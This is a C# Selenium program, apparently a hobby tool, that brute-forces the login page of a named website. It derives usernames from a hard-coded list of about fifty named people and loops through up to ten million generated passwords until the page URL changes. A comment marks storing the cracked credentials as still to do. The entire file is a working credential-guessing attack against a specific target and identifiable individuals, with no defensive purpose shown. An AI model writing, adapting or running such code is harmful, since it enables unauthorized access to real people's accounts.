using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace ArtingolBruteForce
{
    class Program
    {
        static async Task Main()
        {
            string baseUrl = string.Empty;
            string crackedUrl = string.Empty;

            //Instance of Data Generator
            var dataGenerator = new DataGenerator();
            await dataGenerator.UsernameGeneratorAsync(); //TO-DO: Move to constructor, makes more sense
            await dataGenerator.PasswordGeneratorAsync(); //TO-DO: Move to constructor, makes more sense

            using IWebDriver driver = new ChromeDriver();
            driver.Manage().Window.Maximize();
            WebDriverWait wait = new(driver, TimeSpan.FromSeconds(10));

            foreach (var users in dataGenerator.UserList)
            {
                driver.Navigate().GoToUrl("https://ticoservices.net/artingol/index.php");
                baseUrl = driver.Url;
                foreach (var password in dataGenerator.PasswordList)
                {
                    //Wait until username element is ready. If ready we don't have to wait for other elements 
                    var userNameField= wait.Until(webDriver => driver.FindElement(By.Id("txtUser2")));
                    userNameField.Clear();
                    userNameField.SendKeys(users.ToString());
                    var passwordField = driver.FindElement(By.Id("txtPasswd2"));
                    passwordField.Clear();
                    passwordField.SendKeys(password.ToString());
                    driver.FindElement(By.Id("cmdLogin3")).SendKeys(Keys.Enter);
                    crackedUrl = driver.Url;
                    if (crackedUrl != baseUrl)
                    {
                        //We have a match
                        //TO-DO: Store username and password somewhere
                        return;
                    }
                }
            }
        }
    }

    /// <summary>
    /// Generates passwords and users
    /// </summary>
    public class DataGenerator
    {
        /// <summary>
        /// Max number of passwords to be generated
        /// </summary>
        private const int MAX = 10000000; 
        /// <summary>
        /// List of usernames
        /// </summary>
        /// 
        public List<string> UserList { get; set; } = new List<string>();

        /// <summary>
        /// List of passwords
        /// </summary>
        public List<string> PasswordList { get; set; } = new List<string>();

        /// <summary>
        /// Array where passwords are generated. Adding a 64 means it will generated a password 
        /// with 
        /// </summary>
        private int[] passwordArray = new int[] { -1, -1, -1, -1, -1, -1, 64, 64, 64, 64 };

        private readonly char[] Alphabet = {'a','b','c','d','e','f','g','h','i','j' ,'k','l','m','n','o','p',
                        'q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','C','L','M','N','O','P',
                        'Q','R','S','T','U','V','X','Y','Z','0','1','2','3','4','5','6','7','8','9','!','?','@'};

        /// <summary>
        /// List of all participants
        /// </summary>
        private readonly string[] names = new string[] {
            "Jose Quiros",
            "Gerardo Rivera",
            "Diego Gamboa",
            "Franco Cersosimo",
            "Jonathan Ulate",
            "Daniel Bertarioni",
            "Mauricio Amador",
            "Olman Garcia",
            "Will Vasquez",
            "Luis Diego Ulate",
            "Josue Rivera",
            "Jacob Quiros",
            "Jafet Welsh",
            "Luis Esteban Cascante",
            "Gonzalo Siles",
            "Sebastián Ureña",
            "Stefano Fazio",
            "Jose Chaves",
            "Braulio Sandi",
            "Hilda Pineda",
            "Braulio Rivera",
            "Adriano Fazio",
            "JJ Mena",
            "Alejandro Navarro",
            "Esteban Aleman",
            "Mike Salazar",
            "Arturo Cordero",
            "Jeffrie Fonseca",
            "Daniel Aguilar",
            "Carlos García",
            "Alessandro Fazio",
            "Silvia Quesada",
            "Yoel Zumbado",
            "Olman Quesada",
            "Diego Varela",
            "William Quesada",
            "Gabriel Quesada",
            "Gregory Gigi Obando",
            "Kennito Sanchez",
            "Darío Rivera",
            "Luis Felipe Mora",
            "Edgar Aleman",
            "Gloriana Garro",
            "Cesar Hidalgo",
            "Caleb Villalta",
            "Edgar Monestel",
            "Danny Paniagua",
            "Luis Diego Fonseca",
            "Hugo Boss Fernández"
            };

        /// <summary>
        /// Generates usernames async
        /// </summary>
        public async Task UsernameGeneratorAsync()
        {
            var tasks = new List<Task>();
            foreach (var item in names)
            {
                tasks.Add(UsernameGenerator(item));
            }
            await Task.WhenAll();
        }

        /// <summary>
        /// Generates usernames
        /// </summary>
        /// <param name="item"></param>
        /// <returns></returns>
        private Task UsernameGenerator(string item)
        {
            var nameArray = item.ToLower().Split(" ");
            var firstLetter = nameArray[0][0];
            var lastname = nameArray[nameArray.Length - 1];
            var username = firstLetter + lastname;
            this.UserList.Add(username);
            return Task.CompletedTask;
        }

        /// <summary>
        /// Generates passwords async
        /// </summary>
        /// <returns></returns>
        public async Task PasswordGeneratorAsync()
        {
            var tasks = new List<Task>();
            for (int i = 0; i < MAX; ++i)
            {
                tasks.Add(PasswordGenerator(passwordArray, Alphabet));
            }
            await Task.WhenAll();
        }

        /// <summary>
        /// Generates passwords
        /// </summary>
        /// <param name="passwordArray"></param>
        /// <param name="alphabet"></param>
        /// <returns></returns>
        private Task PasswordGenerator(int[] passwordArray, char[] alphabet)
        {
            for (int i = passwordArray.Length - 1; i > 0; --i)
            {
                passwordArray[i]++;
                if (passwordArray[i] < alphabet.Length)
                {
                    break;
                }
                passwordArray[i] = 0;
            }
            var sb = new StringBuilder();
            for (int i = 0; i < passwordArray.Length; ++i)
            {
                if (passwordArray[i] >= 0)
                    sb.Append(alphabet[passwordArray[i]]);
            }
            var password = sb.ToString();
            this.PasswordList.Add(password);

            return Task.CompletedTask;
        }
    }
}
